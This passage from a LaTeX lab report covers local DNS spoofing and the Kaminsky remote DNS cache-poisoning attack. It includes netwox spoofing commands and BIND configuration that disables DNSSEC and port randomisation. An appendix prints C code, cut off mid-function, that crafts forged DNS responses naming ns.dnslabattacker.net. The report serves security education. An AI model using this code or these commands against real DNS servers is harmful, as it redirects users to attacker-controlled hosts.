					\draw (-1.4,-2.6) -- (0.6,-2.6);
					\draw (-1,-2.25) -- (-0.8,-2.25);
					\draw (0.2,-2.25) -- (0,-2.25);
					\draw (-0.4 ,-3.3) node[text width=3cm, align=center]{Attacker};
					
					\draw[rounded corners=8pt] (-6,2.65) rectangle (5.3,-4.1);
					
					\draw[<-,>=stealth',line width=0.4mm] (3.6,-0.65) -- (3.37, -1);
					\draw[densely dotted,line width=0.4mm] (3.37,-1) -- (0.3, -5.7);
					
					\draw[->,>=stealth',line width=0.4mm] (3,-0.65) -- (-0.3, -5.7);
					
					\draw[rounded corners=8pt] (-6,-5.7) rectangle (5.3,-8.2);
					
					\draw (-3.4,-4.5) node[align=left]{Local Area Network (LAN)};
					\draw (-5.14,-5.35) node[align=left]{Internet};
					
					\draw [rounded corners=8pt] (-5.5,-6.2) rectangle node[text width=3cm, align=center]{Root\\DNS Server} (-2.4, -7.7);
					\draw [rounded corners=8pt] (-1.9,-6.2) rectangle node[text width=3cm, align=center]{\texttt{.COM}\\DNS Server} (1.2, -7.7);
					\draw [rounded corners=8pt] (1.7,-6.2) rectangle node[text width=3cm, align=center]{\texttt{example.com}\\DNS Server} (4.8, -7.7);
					
					\draw[->,>=stealth',line width=0.4mm](-3.7,1.9) --(0,1.9);
					\draw[line width=0.4mm] (-0.3,1.9)--(2.9,1.9);
					\draw[-<,>=stealth',line width=0.4mm](-3.7,1.5) --(0,1.5);
					\draw[line width=0.4mm](-0.3,1.5) --(2.9,1.5);
					
					\draw[bend right, densely dotted, line width=0.4mm] (0.4,-1.2) to (2.77,-1);
					\draw[bend right, line width=0.4mm] (0.4,-1.5) to (3.37,-1);
					
				
					\draw (-1.7,2.3) node{\circled{1}};
					\draw (4,-1) node{\circled{4}};
					\draw (1,1.1) node{\circled{5}};
					\draw (1.4,-2.4) node {\circled{2}};
					\draw (1.4,-1) node {\circled{3}};
					\end{tikzpicture}
					
					\begin{flushleft}
					\circled{1} User's system sends out a DNS query to the DNS server.\\
					\circled{2} The DNS server will query other DNS servers over the internet if the records are not cached on the server.\\
					\circled{3} The attacker listens on the DNS request from the network and processes it.\\
					\circled{4} Before the DNS server over the internet is able to reply, the attacker sends out its own packet to spoof the DNS cache on the DNS server in the LAN.\\
					\circled{5} The spoofed information from the DNS server cache is sent back to the user's system to fulfil its DNS request.
					\end{flushleft}
					\centering
					
					\caption{Server DNS Spoofing}
					\label{fig:SpoofServRes}
				\end{figure}
\noindent \texttt{Netwox 105} is used again, but the filter switch is now changed to the IP address of the server instead (192.168.43.157).
\\\\To start this task, the cache must be flushed of any existing DNS requests. The following line does the required action.
\end{par}
\begin{verbatim}
$ sudo rndc flush
\end{verbatim}
\begin{par}
\noindent
The TTL is set to 3600 seconds (1 hour) to ensure that there is sufficient time to analyse the result as the DNS server will respond with the spoofed DNS request for the subsequent hour. The spoofing method will also be switched to \texttt{raw} as \texttt{netwox} will attempt to spoof the MAC address for the spoofed IP address, which is not required as \texttt{tool} will send an ARP request, which will take time to reply and may result in a failed attempt.
\end{par}
\begin{verbatim}
$ sudo netwox 105 --hostname "google.com" --hostnameip 5.6.7.8 
  --authns "google.com" --authnsip 192.168.43.157 --device "Eth0" 
  --ttl 3600 --filter "src host 192.168.43.157" --spoofip "raw"
\end{verbatim}
If the user's system is used to execute the command \texttt{dig google.com}, we will now see that the answer section reflects that the hostname is now redirected to IP address 5.6.7.8. Figure \ref{fig:cachepoison} shows that the answer section has been successfully modified.
\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{cachepoison}
\caption{Google Hostname Redirect Query}
\label{fig:cachepoison}
\end{figure}
\noindent To also check that the DNS cache has been properly poisoned, the log files for the DNS cache is dumped into a plaintext database. The following code is executed to output the database.
\begin{verbatim}
$ sudo rndc dumpdb -cache
$ sudo cat /var/cache/bind/dump.db
\end{verbatim}
For simplicity, we do not print the entire database. Instead, the IP address for the \texttt{google.com} hostname is printed out only. As such, we use the following line instead.
\begin{verbatim}
$ sudo cat /var/cache/bind/dump.db | grep google.com
\end{verbatim}
Looking at the database dump in Figure \ref{fig:dbdump}, the A record reflects the same output as when the \texttt{dig} command has been executed on the user's computer as in Figure \ref{fig:cachepoison}. Furthermore, we notice that under the authority section in Figure \ref{fig:cachepoison}, the six digits represent the TTL for nameserver resolution (48 hours) and the only method of resolving this issue is to flush the DNS cache on the server and/or changing the DNS server to another IP address.
\begin{figure}[H]
\centering
\includegraphics[width=1\linewidth]{dbdump}
\caption{Google A Record}
\label{fig:dbdump}
\end{figure}
%PDF 4: Remote DNS Attack%
\begin{titlepage}
		\begin{center}
		\vspace*{27em}
		\Huge
			\textbf{Remote DNS Attack}
			\vfill
		\end{center}
	\end{titlepage}
	
	\pagenumbering{roman}
	\newpage
	\pagenumbering{arabic}
	\setcounter{section}{0}
	\section{Introduction}
	The Domain Name System (DNS) is used to translate hostnames to IP addresses. This process is termed as DNS resolution, which is transparent to users. However, there are attacks that can be mounted against the DNS resolution process which can redirect the user away from a legitimate to a malicious site, also known as DNS Pharming attacks. However, this is not applicable if the attacker and the server are on different networks, as packet sniffing is not possible. Instead, Kaminsky DNS attack is performed and can be used to spoof DNS requests by attempting to send a packet with a valid transaction ID ($\frac{1}{65536}$ chance).
\section{Overview}
This lab will focus on the Kaminsky DNS attack, by poisoning the DNS cache of the server using a remote machine in the first task. The second task will focus on verification of the attack, by setting up a domain name and using the command \texttt{dig} on the user's machine to check whether the attack mounted previously was successfully executed.\\\\To understand how the Kaminsky's attack works, we need to first understand how the entire DNS architecture operates. The domain \texttt{www.ntu.edu.sg} is used as an example. When a query is sent to our DNS server and it does not have the information in its cache, it will query the root DNS server. The root DNS server will respond by getting our DNS server to query the \texttt{.SG} DNS server. Querying the \texttt{.SG} DNS server will send a reply for our DNS server to query the \texttt{.edu.sg} DNS server. This process continues recursively until there are no sub-level domains to query. The final DNS server, in this case \texttt{ntu.edu.sg} will reply our DNS server with the IP address to \texttt{www.ntu.edu.sg} by transmitting the stored A record. Figure \ref{fig:DNSArch} depicts the process in a simpler and cleaner form that is easier to understand.

%Figure for DNS record querying


\begin{figure}[H]
	\centering
	\tikzset{>=stealth'}
	\begin{tikzpicture}
	
	\draw[fill=red!10] (-5.15,2.15) rectangle (-3.85,1.25);
	\draw (-5.3,2.3) rectangle (-3.7,1.1);
	\draw (-4.1,1.1) rectangle (-4.9,0.6);
	\draw (-5.1,0.75) -- (-5.5,0.4);
	\draw (-3.9,0.75) -- (-3.5,0.4);
	\draw (-5.5,0.4) -- (-3.5,0.4);
	\draw (-5.1,0.75) -- (-4.9,0.75);
	\draw (-3.9,0.75) -- (-4.1,0.75);
	\draw (-4.5,-0.3) node[text width=3cm, align=center]{Attacker};
	
	\draw[rounded corners=8pt] (-6,2.85) rectangle (-3,-0.7);
	\draw (-5,-1) node[align=left]{Network 1};
	
	\draw[fill=green!10] (-5.15,-2.35) rectangle (-3.85,-4.15);
	\draw (-5.3,-2.2) rectangle (-3.7,-4.3);		
	\draw (-4.1,-4.3) rectangle (-4.9,-4.8);
	\draw (-5.1,-4.65) -- (-5.5,-5);
	\draw (-3.9,-4.65) -- (-3.5,-5);
	\draw (-5.5,-5) -- (-3.5,-5);
	\draw (-5.1,-4.65) -- (-4.9,-4.65);
	\draw (-3.9,-4.65) -- (-4.1,-4.65);
	\draw (-4.5,-5.7) node[text width=3cm, align=center]{DNS Server};
	
	\draw[rounded corners=8pt] (-6,-1.65) rectangle (-3,-6.1);
	\draw (-5,-6.4) node[align=left]{Network 2};	
	
	\draw [rounded corners=8pt] (2,2.6) rectangle node[text width=3cm, align=center]{Root\\DNS Server} (4.8, 0.9);
	\draw [rounded corners=8pt] (2,0.25) rectangle node[text width=3cm, align=center]{\texttt{.SG}\\DNS Server} (4.8, -1.25);
	\draw [rounded corners=8pt] (2,-1.95) rectangle node[text width=3cm, align=center]{\texttt{edu.sg}\\DNS Server} (4.8, -3.55);
	\draw [rounded corners=8pt] (2,-4.2) rectangle node[text width=3cm, align=center]{\texttt{ntu.edu.sg}\\DNS Server} (4.8, -5.8);
	
	\draw[rounded corners=8pt] (1.5,2.9) rectangle (5.3,-6.1);
	\draw (2.35,-6.4) node[align=left]{Internet};
	
	\draw[->,bend left=65,line width=0.2mm](-3.7,1.9) to (-3.7,-2.6);
	\draw[<-,bend left=65,line width=0.2mm](-3.7,1.5) to (-3.7,-2.4);
	\draw[->,line width=0.2mm](-3.7,-2.8) to (2,1.95);
	\draw[<-,line width=0.2mm](-3.7,-3) to (2,1.75);
	\draw[->,line width=0.2mm](-3.7,-3.2) to (2,-0.45);
	\draw[<-,line width=0.2mm](-3.7,-3.4) to (2,-0.65);
	\draw[->,line width=0.2mm](-3.7,-3.6) to (2,-2.65);
	\draw[<-,line width=0.2mm](-3.7,-3.8) to (2,-2.85);
	\draw[->,line width=0.2mm](-3.7,-4) to (2,-4.9);
	\draw[<-,line width=0.2mm](-3.7,-4.2) to (2,-5.1);
	
	
	\draw (-2.15,0.2) node{\circled{1}};
	\draw (-0.3,0.5) node{\circled{2}};
	\draw (-0.3,-0.7) node{\circled{3}};
	\draw (-0.85,-1.43) node {\circled{4}};
	\draw (-0.7,-2.4) node {\circled{5}};
	\draw (0.3,-2.55) node {\circled{6}};
	\draw (0.3,-3.52) node {\circled{7}};
	\draw (-0.3,-4.14) node {\circled{8}};
	\draw (-0.3,-5.11) node {\circled{9}};
	\draw (-3.2,-1.2) node {\circled{10}};
	\end{tikzpicture}
	
	\begin{flushleft}
		\circled{1} The attacker queries \texttt{www.ntu.edu.sg} to our DNS Server\\
		\circled{2} The query is forwarded to the root DNS Server\\
		\circled{3} Answer gets our DNS Server to query the \texttt{.SG} DNS Server\\
		\circled{4} The query is forwarded to the \texttt{.SG} DNS Server\\
		\circled{5} Answer gets our DNS Server to query the \texttt{edu.sg} DNS Server\\
		\circled{6} The query is forwarded to the \texttt{edu.sg} DNS Server\\
		\circled{7} Answer gets our DNS Server to query the \texttt{ntu.edu.sg} DNS Server\\
		\circled{8} The query is forwarded to the \texttt{ntu.edu.sg} DNS Server\\
		\circled{9} Answer provides our DNS Server with the IP address for \texttt{www.ntu.edu.sg}\\
		\circled{10} The IP address is forwarded back to the attacker\\
	\end{flushleft}
	\centering
	
	\caption{Complete DNS Querying Process}
	\label{fig:DNSArch}
\end{figure}
\noindent It is during step \circled{2} -- \circled{9} where the packets with spoofed transaction IDs are sent out, with the hope that one of the packets that has a matching transaction ID will be accepted. If that happens, then the attacker has the opportunity to redirect the domain resources to the address of the attacker's choosing. This could redirect users to malicious sites without the user's knowledge as the domain names will remain the same.
\newpage
\section{Attack Sequence}
\subsection{Virtual Machine (VM) Preparation}
\subsubsection{Network Setup}\begin{par}
In the following lab, 3 VMs are configured in the layout shown in Figure \ref{fig:Networksetup}. The figure also displays how a local network is connected to the wider internet and how domains are resolved.\end{par}
\begin{figure}[H]
			\centering
			\begin{tikzpicture}
			\draw[fill=green!10] (-1.05,2.15) rectangle (0.25,1.25);
			\draw (-1.2,2.3) rectangle (0.4,1.1);
			\draw (0,1.1) rectangle (-0.8,0.6);
			\draw (-1,0.75) -- (-1.4,0.4);
			\draw (0.2,0.75) -- (0.6,0.4);
			\draw (-1.4,0.4) -- (0.6,0.4);
			\draw (-1,0.75) -- (-0.8,0.75);
			\draw (0.2,0.75) -- (0,0.75);
			\draw (-0.4,-0.3) node[text width=3cm,align=center]{DNS Server\\192.168.43.157};
			
			
			\draw[fill=blue!10] (-5.15,2.15) rectangle (-3.85,1.25);
			\draw (-5.3,2.3) rectangle (-3.7,1.1);
			\draw (-4.1,1.1) rectangle (-4.9,0.6);
			\draw (-5.1,0.75) -- (-5.5,0.4);
			\draw (-3.9,0.75) -- (-3.5,0.4);
			\draw (-5.5,0.4) -- (-3.5,0.4);
			\draw (-5.1,0.75) -- (-4.9,0.75);
			\draw (-3.9,0.75) -- (-4.1,0.75);
			\draw (-4.5,-0.3) node[text width=3cm, align=center]{User\\192.168.43.154};
			
				\draw[fill=red!10] (3.05,2.15) rectangle (4.35,1.25);
			\draw (2.9,2.3) rectangle (4.5,1.1);
			\draw (4.1,1.1) rectangle (3.3,0.6);
			\draw (3.1,0.75) -- (2.7,0.4);
			\draw (4.3,0.75) -- (4.7,0.4);
			\draw (2.7,0.4) -- (4.7,0.4);
			\draw (3.1,0.75) -- (3.3,0.75);
			\draw (4.3,0.75) -- (4.1,0.75);
			\draw (3.64 ,-0.57) node[text width=4.5cm, align=center]{Attacker\\(Assume Isolated)\\192.168.43.156};
			
			\draw (3.7,-1.31) -- (3.7,-2.4);
			\draw (-4.5,-0.8) -- (-4.5,-2.4);
			\draw (-0.4,-0.8) -- (-0.4,-3.7);
			\draw (3.7,-2.4) -- (0.4,-3.95);
			\draw (-4.5,-2.4)--(-1.2,-3.95);
			\draw[densely dotted, line width=0.3mm](-4.5,-1.5) -- (-0.4,-1.5);
			
			
			\draw[fill=yellow!10] (-1.05,-3.85) rectangle (0.25,-4.75);
			\draw (-1.2,-3.7) rectangle (0.4,-4.9);
			\draw (0,-4.9) rectangle (-0.8,-5.4);
			\draw (-1,-5.25) -- (-1.4,-5.6);
			\draw (0.2,-5.25) -- (0.6,-5.6);
			\draw (-1.4,-5.6) -- (0.6,-5.6);
			\draw (-1,-5.25) -- (-0.8,-5.25);
			\draw (0.2,-5.25) -- (0,-5.25);
			\draw (-0.4,-6.3) node[text width=3cm,align=center]{Gateway\\192.168.43.2};
			
			\draw[rounded corners=8pt] (-6,2.65) rectangle (5.3,-7.1);
			
			\draw[<->,>=stealth',line width=0.5mm] (-0.3,-6.76) -- (-0.3, -8.7);
			
			\draw[rounded corners=8pt] (-6,-8.7) rectangle (5.3,-11.2);
			
			\draw (-3.4,-7.5) node[align=left]{Local Area Network (LAN)};
			\draw (-5.14,-8.35) node[align=left]{Internet};
			
			\draw [rounded corners=8pt] (-5.5,-9.2) rectangle node[text width=3cm, align=center]{Root\\DNS Server} (-2.4, -10.7);
			\draw [rounded corners=8pt] (-1.9,-9.2) rectangle node[text width=3cm, align=center]{\texttt{.COM}\\DNS Server} (1.2, -10.7);
			\draw [rounded corners=8pt] (1.7,-9.2) rectangle node[text width=3cm, align=center]{\texttt{example.com}\\DNS Server} (4.8, -10.7);
				\end{tikzpicture}
			\caption{Network Topology}
			\label{fig:Networksetup}
		\end{figure}
		\subsubsection{Installing DNS server}
		\begin{par} The DNS server that will be used on Ubuntu is \texttt{BIND9} and can be installed using the following line.
		\end{par}
		\begin{verbatim}
		$ sudo apt-get install bind9
		\end{verbatim}
		\subsubsection{Creating domain configuration files}
		\begin{par}
		For the DNS server to function, the configuration file \texttt{named.conf} needs to be present and reads additional files such as \texttt{named.conf.options}, all located in the folder \texttt{/etc/bind/}. The following lines are added so that the DNS server's cache dump can be read.
		\end{par}
		\begin{verbatim}
		options {
		    dump-file    "/var/cache/bind/dump.db";
		};
		\end{verbatim}
		\subsubsection{Starting the DNS server}
		To start the \texttt{BIND9} DNS server, the following command is executed in Terminal.		\begin{verbatim}
		$sudo service bind9 restart
		\end{verbatim}
		\subsubsection{Configuring User Machine}
		\begin{par}
		On the user's machine, the default DNS server needs to be amended. This is done by changing the \texttt{resolv.conf} file. The following single line is added to the file.\end{par} 
		\begin{verbatim}
		nameserver 192.168.43.157 #IP address of server just setup
		\end{verbatim}
		\begin{par}
		\noindent Additionally, the changes made might be overwritten by the DHCP client and needs to be avoided to complete the lab properly. To do so, the DNS server address on our wired connection (Under IPv4 settings) is manually and explicitly defined. To refresh the connection and ensure that the changes take effect immediately, the name of our connection ``Wired connection 1" is clicked to force refresh the network.
		\end{par}
		\subsection{Kaminsky Attack}
		When using the local DNS attack method, it is much simpler as the packets originating from the user or the server can be sniffed easily. However, on a remote network this is not possible. Furthermore, querying a domain will effectively make the results cached onto the server, which will require a period of time before the cache expires (usually 48 hours). This method is ineffective due to the long periods of waiting.\\\\Kaminsky developed an attack that is more effective against systems on remote networks. As the transaction ID on the packet only allows for 65536 values, it is not impractical to flood the server with all 65536 packets. The limitation of blindly flooding the server is that the packet with the legitimate response and valid transaction ID may be received before the spoofed packet with the valid transaction ID may be sent. In this instance, the DNS attack will still fail as the entry from the legitimate response will be successfully cached.\\\\This method was further extended to query sub-domains, as infinitely many sub-domains can be created. Since the query results for the sub-domains do not exist, the DNS server must query everytime it receives a request for each sub-domain. This provides another window and defeats the caching effect.\\\\In the event the transaction ID of the spoofed packet is accepted by the DNS server, the nameserver mentioned in the packet will be cached. At this stage, the DNS cache has been poisoned.
		\\\\To prepare the Kaminsky attack, further configuration is required on the user and DNS server VM.
		\begin{enumerate}
			\itemsep0em
			\item All 3 VM must have its network adapter set to ``NAT'' or Network Address Translation.
			\item For simplicity in this lab, source port randomisation is turned off and set to \textbf{33333}. Source port randomisation makes it more difficult to guess the originating source port of the packet. The file \texttt{/etc/bind/named.conf.options} is modified with the following line.
			\begin{verbatim}
			query-source port 33333
			\end{verbatim}
			\item DNS servers now have an added protection scheme called \textit{DNSSEC (Domain Name Security Extensions)} DNSSEC works on the basis of using digital signatures and standard algorithms such as RSA and ECC as well as using absolute timestamps to ensure the validity of the responses. This method was implemented to solve the problem of forged and manipulated DNS data, such as by the DNS cache poisoning attack.\\\\To turn this feature off, the file \texttt{/etc/bind/named.conf.options} is again modified.
			\begin{verbatim}
			//dnssec-validation auto;
			  dnssec-enable no;
			\end{verbatim}
			\item The last step involves flushing the cache and restarting the DNS server, which can be accomplished with the following code.
			\begin{verbatim}
			$ sudo rndc flush
			$ sudo service bind9 restart
			\end{verbatim}
		\end{enumerate}
		To ensure the attack is successful, the attacker needs to send DNS queries to the DNS server using random hostnames. After each query is sent out, large numbers of DNS response packets are sent out within a short timeframe and hoping that a packet with the correct transaction ID is accepted before the actual response is received.\\\\Before executing the attack, a sample code file \texttt{udp.c} has been provided with missing information to be filled up. The completed code, together with the information for selected blocks has been explained in \hyperref[AppA]{Appendix A}.
		\\\\To create a working program from the completed code, the file is compiled using \texttt{gcc} with the \texttt{lpcap} switch defined.
		\begin{verbatim}
		$ gcc -lpcap udp.c -o attack
		\end{verbatim}
		The attack may take several executions before the execution of the query reflects the malicious nameserver. To analyse whether the attack was successful, the cache is dumped into a database and the required components are extracted out to be printed on the screen.
		\begin{verbatim}
		$ sudo rndc dumpdb -cache
		$ sudo cat /var/cache/bind/dump.db | grep att
		\end{verbatim}
		Successful execution of the attack program will result in a printed line containing the nameserver \texttt{ns.dnslabattacker.net}. Looking further into the actual database itself, it can be seen that the malicious nameserver has been added as an authority for the domain \texttt{example.com}.
		\begin{figure}[H]
		\centering
		\includegraphics[width=0.7\linewidth]{dbdump2}
		\caption{Poisoned DNS Cache}
		\label{fig:dbdump2}
		\end{figure}
		\subsection{Result Verification}
		When performing the DNS query on the domain \texttt{example.com}, it can be noticed that the nameserver is stated. However, nameserver will be marked invalid as the zone to receive queries is not set-up to respond. Due to this, there is no valid record for the domain.\\\\To resolve this issue, a zone record is created on the server itself (so it does not need to send requests to the internet to obtain the IP address). To do so, the following configurations need to be made:
		\begin{enumerate}
		\itemsep0em
		\item The file \texttt{/etc/bind/named.conf.default-zones} has the following lines added to it.
		\begin{verbatim}
		zone "ns.dnslabattacker.net" {
		    type master;
		    file "/etc/bind/db.attacker";
		};
		\end{verbatim}
		\item The file \texttt{/etc/bind/db.attacker} is created to hold the resource records required to redirect the DNS queries to the malicious DNS server.
		\begin{verbatim}
		$TTL 604800
		@        IN    SOA    localhost. root.localhost. (
		         2; serial
		         604800; refresh
		         86400;retry
		         2419200; expire
		         604800); negative cache TTL
		         
		@        IN    NS    ns.dnslabattacker.net.
		@        IN    A     192.168.43.157
		@        IN    AAAA  ::1
		\end{verbatim}
		\item Because the attacker's system will also receive DNS queries, it too must also be configured with the relevant zone to reply the queries. In the file \texttt{/etc/bind/named.conf.local}, the following lines are added.
		\begin{verbatim}
		zone "example.com"{
		        type master;
		        file "/etc/bind/example.com.db";
		};
		\end{verbatim}
		Another file \texttt{/etc/bind/example.com.db} must also be created.
		\begin{verbatim}
		$TTL 3D
		@        IN    SOA    ns.example.com. admin.example.com. (
		         2008111001
		         8H
		         2H
		         4W
		         1D)
		
		@        IN    NS    ns.dnslabattacker.net.
		@        IN    MX    10 mail.example.com.
		
		www      IN    A     1.2.3.4
		mail     IN    A     5.6.7.8
		*.example.com  IN  A 9.10.11.12
		\end{verbatim}
		After the files have been modified, the \texttt{bind9} service must be restarted for the changes to take effect. To do so, the following line can be used to restart the server.
		\begin{verbatim}
		$ sudo service bind9 restart
		\end{verbatim}
		\end{enumerate}
		The same attack program is executed now and if the attack is successful, the IP address 1.2.3.4 will appear when the domain \texttt{www.example.com} is queried.
		
\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{poisonsuccess}
\caption{Complete Cache Poisoning}
\label{fig:poisonsuccess}
\end{figure}

		
	\newgeometry{left=1.5cm,top=1cm, bottom=2cm,right=1.5cm}
		\section{Appendix A: \texttt{udp.c}}
		\subsection{Code}
		\label{AppA}
		
		\begin{minted}[linenos,breaklines]{C}
// ----udp.c------
// This sample program must be run with root privileges!
//
// The program is to spoof tons of different queries to the victim.
// Use wireshark to study the packets. However, it is not enough for
// the lab, please finish the response packet and complete the task.
//
// Compile command:
// gcc -lpcap udp.c -o udp
//
//

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>
// The packet length

#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

// Can create separate header file (.h) for all headers' structure

// The IP header's structure

struct ipheader
{
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;

//    unsigned char      iph_flag;

    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;

};

// UDP header's structure

struct udpheader
{
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};
struct dnsheader
{
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};
// This structure is just for convenience, as 4 byte data often appears in the DNS packets.
struct dataEnd
{
    unsigned short int  type;
    unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)


// (Added) Structure to hold the answer end section
struct ansEnd
{
    //char* name;
    unsigned short int type;
    //char* type;
    unsigned short int class;
    //char* class;
    //unsigned int ttl;
    unsigned short int ttl_l;
    unsigned short int ttl_h;
    unsigned short int datalen;
};

// (Added) structure to hold the authorative nameserver end section
struct nsEnd
{
    //char* name;
    unsigned short int type;
    unsigned short int class;
    //unsigned int ttl;
    unsigned short int ttl_l;
    unsigned short int ttl_h;
    unsigned short int datalen;
    //unsigned int ns;
};

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum=0;
    for(; isize>1; isize-=2)
    {
        cksum+=*usBuff++;
    }
    if(isize==1)
    {
        cksum+=*(uint16_t *)usBuff;
    }
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
    struct ipheader *tempI=(struct ipheader *)(buffer);
    struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
    struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
    tempH->udph_chksum=0;
    sum=checksum( (uint16_t *)   &(tempI->iph_sourceip),8 );
    sum+=checksum((uint16_t *) tempH,len);

    sum+=ntohs(IPPROTO_UDP+len);

    sum=(sum>>16)+(sum & 0x0000ffff);
    sum+=(sum>>16);

    return (uint16_t)(~sum);
}
// Function for checksum calculation. From the RFC,

// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."

unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// (Added) Create response packet

int response(char* request_url, char* src_addr, char* dest_addr)
{

// socket descriptor
    int sd;

// buffer to hold the packet
    char buffer[PCKT_LEN];

// set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

// Our own headers' structures
    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

// Data is the pointer that points to the first byte of the DNS payload
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));


////////////////////////////////////////////////////////////////////////
// dns fields(UDP payload field)
// relate to the lab, you can change them. begin:
////////////////////////////////////////////////////////////////////////

//The flag you need to set

    dns->flags=htons(FLAG_R); //Response

//only 1 query, so the count should be one.
    dns->QDCOUNT=htons(1);
    dns->ANCOUNT=htons(1);
    dns->NSCOUNT=htons(1);
    dns->ARCOUNT=htons(1);

//query string
    strcpy(data,request_url);
    int length=strlen(data)+1;

//This is more convenient to write the 4bytes in a more organised way.

    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);
    
//add the answer section here
    char *ans=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length);

    strcpy(ans,request_url);
    int anslength= strlen(ans)+1;

    struct ansEnd * ansend=(struct ansEnd *)(ans+anslength);
    ansend->type=htons(1);
    ansend->class=htons(1);
    ansend->ttl_l=htons(0x00); //TTL is 208 seconds
    ansend->ttl_h=htons(0xD0);
    ansend->datalen=htons(4);

    char *ansaddr=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength);

    strcpy(ansaddr,"\1\2\3\4"); //Provides the IP address of query resource 
    int addrlen = strlen(ansaddr);

//add the authoritative section here
    char *ns =(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength+addrlen);
    strcpy(ns,"\7example\3com"); // Nameserver for resolving domain
    int nslength= strlen(ns)+1;

    struct nsEnd * nsend=(struct nsEnd *)(ns+nslength);
    nsend->type=htons(2);
    nsend->class=htons(1);
    nsend->ttl_l=htons(0x00);
    nsend->ttl_h=htons(0xD0);
    nsend->datalen=htons(23);

    char *nsname=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength+addrlen+sizeof(struct nsEnd)+nslength);

    strcpy(nsname,"\2ns\16dnslabattacker\3net"); //Provides resolution to the domain
    int nsnamelen = strlen(nsname)+1;

//add the additional report here
    char *ar=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength+addrlen+sizeof(struct nsEnd)+nslength+nsnamelen);
    strcpy(ar,"\2ns\16dnslabattacker\3net"); //IP Address (A record) of nameserver
    int arlength = strlen(ar)+1;
    struct ansEnd* arend = (struct ansEnd*)(ar + arlength);
    arend->type = htons(1);
    arend->class=htons(1);
    arend->ttl_l=htons(0x00);
    arend->ttl_h=htons(0xD0);
    arend->datalen=htons(4);
    char *araddr=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength+addrlen+sizeof(struct nsEnd)+nslength+nsnamelen+arlength+sizeof(struct ansEnd));

    strcpy(araddr,"\1\2\3\4"); //IP Address for resource
    int araddrlen = strlen(araddr);


/////////////////////////////////////////////////////////////////////
//
// DNS format, relate to the lab, you need to change them, end
//
//////////////////////////////////////////////////////////////////////

    /*************************************************************************************
    Construction of the packet is done.
    now focus on how to do the settings and send the packet we have composed out
    ***************************************************************************************/
    // Source and destination addresses: IP and port

    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
//while(1){

    //dns->response_id=rand(); // transaction ID for the query packet, use random #
    // Create a raw socket with UDP protocol

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);


    if(sd<0 ) // if socket fails to be created
        printf("socket error\n");

    // The source is redundant, may be used later if needed
    // The address family

    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    // Port numbers

    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    // IP addresses

    sin.sin_addr.s_addr = inet_addr(src_addr); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr("199.43.135.53"); // this is the first argument we input into the program

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.

    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay

    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)+anslength+sizeof( struct ansEnd)+nslength+sizeof(struct nsEnd)+addrlen+nsnamelen+arlength+sizeof(struct ansEnd)+araddrlen); // length + dataEnd_size == UDP_payload_size

    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // we give a random number for the identification

    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP

    // Source IP address, use the actual IP address of example.com nameserver

